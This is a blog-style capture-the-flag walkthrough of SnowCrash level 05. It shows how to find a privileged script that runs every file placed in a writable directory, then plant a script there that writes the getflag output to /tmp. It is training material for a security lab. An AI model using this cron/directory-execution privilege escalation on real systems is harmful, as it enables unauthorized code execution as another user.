---
title: 42 SnowCrash Level05 - Walkthrough 👿
tags:
  - ctfs
  - snowcrash
  - 42project
  - services
categories:
  - ctfs
  - 42project
date: 2024-05-18 14:50:03
---


### Introduction

In level 05, we need to exploit a script (`openarenaserver`) that executes all scripts found in a specific directory (`/opt/openarenaserver/`). By placing a script containing the `getflag` command in this directory, we can obtain the flag.

### Steps:

1. **Finding Relevant Files:**
   First, we search for files owned by the user `flag05` and his group:

   ```sh
   level05@SnowCrash:~$ find / -user flag05 -group flag05 2>/dev/null
   /usr/sbin/openarenaserver
   /rofs/usr/sbin/openarenaserver
   ```

2. **Analyzing the Script:**
    We examine the contents of the openarenaserver script:

    ```sh
    level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
    done
    ```
    The script iterates through all files in /opt/openarenaserver/, executes them with a time limit of 5 seconds, and then removes them.

3. Exploiting the Script:
    We create a script named xploit containing the getflag command in the /opt/openarenaserver/ directory:
    ```shell
    level05@SnowCrash:~$ echo "'getflag' > /tmp/xploit" > /opt/openarenaserver/xploit
    ```

4. Monitoring the Result:
    We watch the content of /tmp/xploit to capture the flag:
    ```shell
    level05@SnowCrash:~$ watch cat /tmp/xploit
    Every 2.0s: cat /tmp/xploit                                           Fri Oct 27 17:02:01 2023
    Check flag. Here is your token : ************************
    ```
    The flag is obtained by executing the getflag command within the openarenaserver script.

## Conclusion
By understanding the behavior of the openarenaserver script and exploiting its functionality to execute arbitrary commands placed in the /opt/openarenaserver/ directory, we successfully obtained the flag for level 05.
